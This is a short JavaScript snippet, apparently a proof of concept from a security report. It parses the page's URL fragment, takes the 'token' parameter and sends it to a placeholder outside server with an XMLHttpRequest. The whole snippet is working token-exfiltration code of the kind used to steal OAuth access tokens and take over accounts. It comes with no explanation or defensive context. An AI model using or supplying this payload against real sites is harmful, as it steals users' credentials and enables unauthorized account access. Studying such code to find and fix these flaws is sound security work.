urlp=[];s=location.toString().split('#');s=s[1].split('&');for(i=0;i<s.length;i++){u=s[i].split('=');urlp[u[0]]=u[1];};
var code = urlp['token']
var rep = 'https://<server.url{F1878620}>/token?=' + code;
var xhttp = new XMLHttpRequest();
xhttp.open("GET", rep, true);
xhttp.send();